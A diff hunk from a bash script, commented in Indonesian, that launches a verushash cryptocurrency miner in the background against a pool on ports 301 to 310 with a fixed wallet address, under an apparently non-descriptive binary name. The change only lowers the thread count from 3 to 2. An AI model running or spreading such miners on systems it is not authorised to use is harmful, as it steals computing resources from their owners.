@@ -48,7 +48,7 @@ while [ $(date +%s) -lt $end_time ]; do
     # Memulai proses untuk beberapa port
     for port in $(seq 301 310); do
       # Menjalankan proses dengan parameter yang ditentukan di latar belakang
-      nohup $dynamic_sgr -a verushash --pool $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf --timeout 120 -t 3 -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
+      nohup $dynamic_sgr -a verushash --pool $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf --timeout 120 -t 2 -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
       process_pid=$!
 
       echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port"
